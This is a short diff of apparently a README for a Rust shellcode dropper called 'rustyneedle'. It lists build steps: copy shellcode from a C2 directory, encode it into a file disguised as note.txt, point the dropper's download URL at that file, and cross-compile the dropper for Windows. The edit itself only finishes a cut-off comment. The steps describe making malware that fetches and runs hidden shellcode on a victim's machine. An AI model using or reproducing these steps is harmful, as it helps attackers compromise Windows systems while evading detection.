@@ -29,7 +29,7 @@ cp ~/c2/shellcode.bin .
 # Encode the shellcode. note that the output file name is note.txt
 python3 rustyneedle/encode.py shellcode.bin 3 note.txt
 
-# Take note of where in the dropper we put the downloaded url, and put the note.txt s
+# Take note of where in the dropper we put the downloaded url, and put the note.txt shellcode file there
 
 # Compile the main.rs dropper
 cargo build --target x86_64-pc-windows-gnu --release
